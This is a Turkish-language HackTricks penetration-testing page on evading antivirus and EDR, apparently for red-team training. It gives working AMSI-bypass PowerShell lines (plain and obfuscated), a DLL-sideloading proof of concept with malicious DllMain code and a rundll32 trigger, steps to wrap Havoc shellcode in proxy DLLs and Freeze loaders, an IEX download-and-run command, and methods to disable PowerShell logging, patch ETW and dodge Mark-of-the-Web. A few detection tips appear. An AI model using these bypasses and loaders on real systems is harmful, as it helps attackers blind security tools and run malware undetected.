# Antivirüs (AV) Atlama

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa [**@m2rc_p**](https://twitter.com/m2rc_p) tarafından yazıldı!**

## Defender'ı Durdur

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmak için bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durdurmak için bir araç.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Kaçınma Metodolojisi**

Günümüzde AV'ler bir dosyanın kötü amaçlı olup olmadığını kontrol etmek için farklı yöntemler kullanır: static detection, dynamic analysis ve daha gelişmiş EDR'ler için behavioural analysis.

### **Static detection**

Static detection, bir binary veya script içindeki bilinen kötü amaçlı stringleri ya da byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (ör. file description, company name, digital signatures, icon, checksum, vb.) gerçekleştirilir. Bu, bilinen açık araçları kullanmanın sizi daha kolay yakalayabileceği anlamına gelir; çünkü muhtemelen analiz edilip kötü amaçlı olarak işaretlenmişlerdir. Bu tür tespitten kaçınmanın birkaç yolu vardır:

- **Encryption**

Eğer binary'i şifrelerseniz, AV programınız programınızı tespit edemez, ancak programı bellekte decrypt edip çalıştırmak için bir loader'a ihtiyacınız olacaktır.

- **Obfuscation**

Bazen tek yapmanız gereken binary veya script içindeki bazı stringleri değiştirmektir; bu AV'i atlatmak için yeterli olabilir, ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak zaman alıcı olabilir.

- **Custom tooling**

Kendi araçlarınızı geliştirirseniz bilinen kötü imzalar olmayacaktır, fakat bu çok zaman ve emek gerektirir.

> [!TIP]
> Windows Defender'ın static detection'ına karşı kontrol yapmak için iyi bir yol [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)'dir. Temelde dosyayı birden çok segmente bölüp Defender'a her birini ayrı ayrı taratır; böylece binary'nizde işaretlenen kesin stringleri veya byte'ları size söyleyebilir.

Pratik AV kaçınma konusunda bu [YouTube oynatma listesine](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) göz atmanızı şiddetle tavsiye ederim.

### **Dynamic analysis**

Dynamic analysis, AV'in binary'nizi bir sandbox'ta çalıştırıp kötü amaçlı aktiviteleri izlemesidir (ör. tarayıcı şifrelerinizi decrypt edip okumaya çalışmak, LSASS üzerinde minidump almak, vb.). Bu kısım üzerinde çalışmak biraz daha zor olabilir, fakat sandbox'ları atlatmak için yapabileceğiniz bazı şeyler şunlardır.

- **Sleep before execution** Uygulamanın nasıl implemente edildiğine bağlı olarak, bu AV'in dynamic analysis'ini atlatmak için çok iyi bir yol olabilir. AV'lerin kullanıcı deneyimini kesintiye uğratmamak için dosyaları taramak üzere çok kısa bir süreleri vardır, bu yüzden uzun uyumalar (sleep) binary'lerin analizini bozabilir. Sorun şu ki, birçok AV'in sandbox'ı uygulamanın nasıl yazıldığına bağlı olarak sleep'i atlayabilir.
- **Checking machine's resources** Genellikle Sandbox'ların kullanabileceği kaynaklar çok azdır (ör. < 2GB RAM), aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada çok yaratıcı olabilirsiniz, örneğin CPU sıcaklığını veya fan hızlarını kontrol etmek gibi; her şey sandbox'ta implemente edilmiş olmayacaktır.
- **Machine-specific checks** Hedef almak istediğiniz kullanıcının workstation'ı "contoso.local" domain'ine bağlıysa, bilgisayarın domain'ini kontrol edip belirttiğinizle eşleşip eşleşmediğine bakabilirsiniz; eşleşmiyorsa programınızı sonlandırabilirsiniz.

Ortaya çıktığı üzere Microsoft Defender'ın Sandbox bilgisayar adı HAL9TH'tir; bu yüzden malware'inizde patlatmadan önce bilgisayar adını kontrol edebilirsiniz; eğer ad HAL9TH ile eşleşiyorsa Defender'ın sandbox'ı içindesiniz demektir, dolayısıyla programınızı sonlandırabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı gitmek için [@mgeeky](https://twitter.com/mariuszbit)'den bazı çok iyi ipuçları

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Daha önce de söylediğimiz gibi, **public tools** eninde sonunda **tespit edilir**, bu yüzden kendinize şu soruyu sormalısınız:

Örneğin, LSASS'i dump etmek istiyorsanız, **gerçekten mimikatz kullanmanız mı lazım**? Yoksa LSASS'i dump eden, daha az bilinen farklı bir proje kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. Mimikatz örneği alınırsa, muhtemelen AV'ler ve EDR'ler tarafından en çok işaretlenen kötü amaçlı yazılımlardan biridir; proje kendisi süper havalı olsa da, AV'leri atlatmak için onunla uğraşmak bir kabus olabilir, bu yüzden amacınıza uygun alternatiflere bakın.

> [!TIP]
> Payload'larınızı kaçınma amaçlı değiştirirken, Defender'da otomatik sample gönderimini kapattığınızdan emin olun ve lütfen, cidden, eğer uzun vadede kaçınma hedefiniz varsa **VIRUSTOTAL'A YÜKLEMEYİN**. Bir payload'un belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, onu bir VM'e kurun, otomatik sample gönderimini kapatmaya çalışın ve sonuçtan memnun olana kadar orada test edin.

## EXE'ler vs DLL'ler

Mümkün olduğunda, kaçınma için her zaman **DLL'leri kullanmayı önceliklendirin**, deneyimlerime göre DLL dosyaları genellikle **çok daha az tespit edilir** ve analiz edilir, bu yüzden bazı durumlarda tespitten kaçınmak için kullanabileceğiniz çok basit bir hiledir (tabii payload'unuz DLL olarak çalıştırılabilirse).

Bu görüntüde de görebileceğimiz gibi, Havoc'tan bir DLL Payload'un antiscan.me'de tespit oranı 4/26 iken, EXE payload'un tespit oranı 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me karşılaştırması: normal bir Havoc EXE payload vs normal bir Havoc DLL</p></figcaption></figure>

Şimdi DLL dosyalarıyla daha gizli olmak için kullanabileceğiniz bazı hileleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, loader'ın kullandığı DLL arama sırasından faydalanarak, hedef uygulama ile kötü amaçlı payload(lar)ı yan yana konumlandırmayı kullanır.

DLL Sideloading'e hassas programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak kontrol edebilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e duyarlı programların listesini ve bu programların yüklemeye çalıştığı DLL dosyalarını yazdırır.

Kesinlikle **DLL Hijackable/Sideloadable programlarını kendiniz keşfetmenizi** tavsiye ederim; bu teknik doğru yapıldığında oldukça gizlidir, ancak kamuya açık olarak bilinen DLL Sideloadable programlarını kullanırsanız kolayca yakalanabilirsiniz.

Sadece bir programın yüklemesini beklediği isimde kötü amaçlı bir DLL yerleştirmek, payload'unuzu çalıştırmaz; çünkü program o DLL içinde bazı belirli fonksiyonları bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adlı başka bir teknik kullanacağız.

**DLL Proxying**, bir programın proxy (ve kötü amaçlı) DLL'den yaptığı çağrıları orijinal DLL'e iletir; böylece programın işlevselliği korunur ve payload'unuzun yürütülmesini yönetebiliriz.

Bu örnekte [@flangvik](https://twitter.com/Flangvik/) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardır:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve orijinal yeniden adlandırılmış DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz (encoded with [SGN](https://github.com/EgeBalci/sgn)) hem de proxy DLL'imiz [antiscan.me](https://antiscan.me) üzerinde 0/26 tespit oranına sahip! Buna bir başarı diyebilirim.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında daha derinlemesine öğrenmek için [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) ve ayrıca [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) izlemenizi şiddetle öneririm.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules, gerçekte "forwarders" olan fonksiyonlar export edebilir: kodu işaret etmek yerine, export girdisi `TargetDll.TargetFunc` biçiminde bir ASCII string içerir. Bir çağırıcı export'ı çözdüğünde, Windows loader şunları yapar:

- `TargetDll` henüz yüklenmemişse yükler
- ondan `TargetFunc`'ı çözer

Anlaşılması gereken temel davranışlar:
- Eğer `TargetDll` bir KnownDLL ise, korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).
- Eğer `TargetDll` bir KnownDLL değilse, ileri çözümü yapan modülün dizinini de içeren normal DLL arama sırası kullanılır.

Bu, dolaylı bir sideloading primitive'i sağlar: bir non-KnownDLL modül adına forward edilen bir fonksiyon export eden imzalı bir DLL bulun; sonra bu imzalı DLL'i, forward edilen hedef modül ile tam olarak aynı isme sahip, saldırgan kontrolündeki bir DLL ile aynı dizine koyun. Forward edilen export çağrıldığında, loader forward'ı çözer ve aynı dizinden sizin DLL'inizi yükleyerek DllMain'inizi çalıştırır.

Windows 11'de gözlemlenen örnek:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırasına göre çözülür.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'ini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod çalıştırmayı sağlamak için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için forward edilmiş fonksiyonu uygulamanıza gerek yoktur.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İmzalı bir LOLBin ile forward'ı tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Gözlemlenen davranış:
- rundll32 (signed) side-by-side `keyiso.dll`'yi (signed) yükler
- `KeyIsoSetAuditingInterface`'i çözerken, yükleyici yönlendirmeyi (`forward`) `NCRYPTPROV.SetAuditingInterface`'e takip eder
- Yükleyici daha sonra `C:\test`'ten `NCRYPTPROV.dll`'i yükler ve onun `DllMain`'ini çalıştırır
- Eğer `SetAuditingInterface` uygulanmamışsa, `DllMain` zaten çalıştıktan sonra ancak bir "missing API" hatası alırsınız

Hunting tips:
- Hedef modül KnownDLL olmayan forwarded export'lara odaklanın. KnownDLLs şu anahtarda listelenir: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Forwarded exports'ı şu araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 forwarder envanterine bakarak adayları arayın: https://hexacorn.com/d/apis_fwd.txt

Tespit/savunma fikirleri:
- Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Aşağıdaki gibi işlem/modül zincirleri için uyarı ver: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` under user-writable paths
- Kod bütünlüğü politikalarını (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde write+execute'e izin vermeyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, askıya alınmış işlemler, doğrudan sistem çağrıları ve alternatif yürütme yöntemleri kullanarak EDR'leri atlatmak için bir payload toolkit'idir`

Freeze'i shellcode'unuzu gizlice yükleyip çalıştırmak için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion sadece kedi ve fare oyunu gibidir; bugün işe yarayan yarın tespit edilebilir, bu yüzden sadece tek bir araca güvenmeyin; mümkünse birden fazla evasion tekniğini zincirleyin.

## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"ı önlemek için oluşturuldu. Başlangıçta, AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu, bu yüzden bir şekilde yükleri **doğrudan bellekte** çalıştırabiliyorsanız, AV bunu engelleyemezdi çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir:

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Antivirus çözümlerinin, script içeriklerini şifrelenmemiş ve gizlenmemiş bir biçimde açığa çıkararak script davranışını incelemesine olanak tanır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` çalıştırmak Windows Defender'da aşağıdaki uyarıyı üretecektir.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Bunun nasıl `amsi:` önekini eklediğine ve ardından betiğin çalıştırıldığı yürütülebilir dosyanın yolunu (bu durumda powershell.exe) gösterdiğine dikkat edin.

Disk'e hiç dosya bırakmadık, ancak AMSI nedeniyle bellekte yakalandık.

Ayrıca, **.NET 4.8**'den itibaren C# kodu da AMSI tarafından taranır. Bu, hatta `Assembly.Load(byte[])` ile bellekte yüklemeyi de etkiler. Bu yüzden AMSI'den kaçınmak istiyorsanız, bellekte yürütme için daha düşük .NET sürümlerini (ör. 4.7.2 veya daha düşük) kullanmanız önerilir.

There are a couple of ways to get around AMSI:

- **Obfuscation**

AMSI büyük ölçüde statik tespitlerle çalıştığından, yüklemeye çalıştığınız scriptleri değiştirmeniz tespitten kaçınmak için iyi bir yol olabilir.

Ancak AMSI, scriptlerin birden fazla katmanı olsa bile obfuskasyonu çözme kabiliyetine sahip olduğundan, obfuscation yapılan şekle bağlı olarak kötü bir seçenek olabilir. Bu nedenle kaçış her zaman basit değildir. Yine de bazen yapmanız gereken tek şey birkaç değişken adını değiştirmektir; bu yüzden ne kadar işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe, vb.) sürecine bir DLL yüklenerek uygulandığından, ayrıcalıksız bir kullanıcı olarak bile onunla uğraşmak mümkündür. AMSI'nin bu uygulama hatası nedeniyle araştırmacılar AMSI taramasından kaçınmak için birden fazla yol buldular.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tek gereken, mevcut powershell süreci için AMSI'yi kullanılamaz hale getiren tek bir powershell satırıydı. Bu satır elbette AMSI tarafından tespit edildi; bu yüzden bu tekniği kullanmak için bazı değişiklikler gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)ten aldığım modifiye edilmiş AMSI bypass.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Unutmayın, bu yayınlandıktan sonra muhtemelen tespit edilecektir; eğer hedefiniz fark edilmeden kalmaksa herhangi bir kod yayımlamamalısınız.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi ve amsi.dll içindeki "AmsiScanBuffer" fonksiyonunun adresinin bulunmasını (kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu) ve bu adresin E_INVALIDARG kodunu döndürecek yönergelerle üzerine yazılmasını içerir; böylece gerçek taramanın sonucu 0 dönecek ve bu temiz sonuç olarak yorumlanacaktır.

> [!TIP]
> Daha ayrıntılı açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.

AMSI'yi bypass etmek için powershell ile kullanılan birçok başka teknik de vardır; bunları öğrenmek için [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) adreslerini inceleyin.

Bu araç da [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) AMSI'yi atlatmak için scriptler üretir.

**Remove the detected signature**

Tespit edilen AMSI imzasını mevcut process'in belleğinden kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçları kullanabilirsiniz. Bu araç, mevcut process'in belleğinde AMSI imzasını tarar ve ardından üzerine NOP instructions yazarak belleğinden etkili bir şekilde kaldırır.

**AV/EDR products that uses AMSI**

AMSI kullanan AV/EDR ürünlerinin bir listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**Use Powershell version 2**
Eğer PowerShell sürüm 2 kullanırsanız, AMSI yüklenmez; bu sayede scriptlerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:
```bash
powershell.exe -version 2
```
## PS Günlüğü

PowerShell logging, bir sistemde çalıştırılan tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Bu, denetleme ve sorun giderme amaçları için yararlı olabilir, ancak **algılamadan kaçmak isteyen saldırganlar için bir problem** de olabilir.

PowerShell logging'i atlatmak için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakın**: Bu amaç için [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **PowerShell sürüm 2'yi kullanın**: PowerShell sürüm 2'yi kullanırsanız, AMSI yüklenmeyecektir; böylece betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Unmanaged PowerShell Oturumu kullanın**: Savunmalar olmadan bir PowerShell başlatmak için [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (bu, Cobal Strike'dan `powerpick`'in kullandığı yöntemdir).


## Obfuscation

> [!TIP]
> Birkaç obfuscation tekniği veriyi şifrelemeye dayanır; bu, ikilinin entropisini artırır ve AV/EDR'lerin bunu tespit etmesini kolaylaştırır. Bununla dikkatli olun ve şifrelemeyi yalnızca hassas veya gizlenmesi gereken kod bölümlerine uygulamayı düşünün.

### ConfuserEx ile Korunan .NET İkili Dosyalarının Deobfuscasyonu

ConfuserEx 2 (veya ticari çatalları) kullanan kötü amaçlı yazılımları analiz ederken, decompiler'ları ve sandbox'ları engelleyen birden çok koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, daha sonra dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilecek neredeyse orijinal bir IL'yi güvenilir şekilde **geri yükler**.

1.  Anti-tamper kaldırma – ConfuserEx her *method body*'yi şifreler ve bunu *module* statik yapıcı (`<Module>.cctor`) içinde çözer. Bu ayrıca PE checksum'u da yama yapar, bu yüzden herhangi bir değişiklik ikiliyi çökertir. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly yazmak için **AntiTamperKiller** kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Çıktı, kendi unpacker'ınızı oluştururken kullanışlı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Sembol / kontrol akışı kurtarma – *clean* dosyayı **de4dot-cex** (ConfuserEx farkında de4dot çatallaması) ile besleyin.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profilini seç
• de4dot kontrol-akışı flattening'ini geri alacak, orijinal namespace'leri, class'ları ve değişken isimlerini geri getirecek ve sabit string'leri çözecektir.

3.  Proxy-call kaldırma – ConfuserEx, doğrudan method çağrılarını decompilation'ı daha da bozmak için hafif sarıcılarla (diğer adıyla *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra, opak sarıcı fonksiyonlar (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'lerini gözlemlemelisiniz.

4.  Manuel temizlik – Ortaya çıkan ikiliyi dnSpy altında çalıştırın, büyük Base64 blob'ları veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayarak *gerçek* payload'u bulun. Genellikle kötü amaçlı yazılım bunu `<Module>.byte_0` içinde başlatılan TLV-encoded bir byte dizisi olarak depolar.

Yukarıdaki zincir, kötü amaçlı örneği çalıştırmaya gerek kalmadan yürütme akışını **geri yükler** — çevrimdışı bir iş istasyonunda çalışırken kullanışlıdır.

> 🛈  ConfuserEx, otomatik örnek triage'i için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir attribute üretir.

#### Tek satırlık
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): The aim of this project is to provide an open-source fork of the [LLVM](http://www.llvm.org/) compilation suite able to provide increased software security through [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) and tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstates how to use `C++11/14` language to generate, at compile time, obfuscated code without using any external tool and without modifying the compiler.
- [**obfy**](https://github.com/fritzone/obfy): Add a layer of obfuscated operations generated by the C++ template metaprogramming framework which will make the life of the person wanting to crack the application a little bit harder.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is a x64 binary obfuscator that is able to obfuscate various different pe files including: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is a simple metamorphic code engine for arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is a fine-grained code obfuscation framework for LLVM-supported languages using ROP (return-oriented programming). ROPfuscator obfuscates a program at the assembly code level by transforming regular instructions into ROP chains, thwarting our natural conception of normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is a .NET PE Crypter written in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor is able to convert existing EXE/DLL into shellcode and then load them

## SmartScreen & MoTW

İnternetten bazı yürütülebilir dosyaları indirip çalıştırdığınızda bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak zararlı uygulamaları çalıştırmaktan korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen ağırlıklı olarak itibar tabanlı bir yaklaşımla çalışır; nadiren indirilen uygulamalar SmartScreen'i tetikler ve böylece dosyanın çalıştırılmasını engelleyip kullanıcıyı uyarır (ancak dosya hala Daha Fazla Bilgi -> Yine de Çalıştır seçilerek çalıştırılabilir).

**MoTW** (Mark of The Web), Zone.Identifier adında bir NTFS Alternate Data Stream olarak internetten indirilen dosyalar üzerinde otomatik olarak oluşturulur; içinde dosyanın indirildiği URL de bulunur.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sinin kontrol edilmesi.</p></figcaption></figure>

> [!TIP]
> **Güvenilir** bir imzalama sertifikasıyla imzalanmış yürütülebilir dosyaların **SmartScreen'i tetiklemeyeceğini** not etmek önemlidir.

Payload'larınızın Mark of The Web almasını önlemenin çok etkili yollarından biri, bunları ISO gibi bir konteyner içinde paketlemektir. Bunun nedeni, Mark-of-the-Web (MOTW) uygulamasının **NTFS olmayan** hacimlere uygulanamamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) payload'ları Mark-of-the-Web'ten kaçınmak için çıktı konteynerlerine paketleyen bir araçtır.

Örnek kullanım:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları kaydetmesine** olanak veren güçlü bir kayıt mekanizmasıdır. Ancak, güvenlik ürünleri tarafından kötü niyetli etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (atlatılmasına) benzer şekilde, kullanıcı alanı sürecinin **`EtwEventWrite`** fonksiyonunun herhangi bir olay kaydetmeden hemen dönmesini sağlamak da mümkündür. Bu, fonksiyonu bellekte yama yaparak hemen dönmesini sağlamakla yapılır; böylece o süreç için ETW kaydı fiilen devre dışı bırakılmış olur.

Daha fazla bilgi için şunlara bakabilirsiniz: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# ikili dosyalarını bellekte yüklemek uzun zamandır bilinen bir yöntemdir ve AV tarafından yakalanmadan post-exploitation araçlarınızı çalıştırmak için hâlâ çok iyi bir yoldur.

Payload doğrudan diske dokunmadan belleğe yükleneceği için, tüm süreç için AMSI'yi yama yapma konusunu düşünmemiz yeterli olacaktır.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc, vb.) zaten C# assembly'lerini doğrudan bellekte çalıştırma yeteneği sağlar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

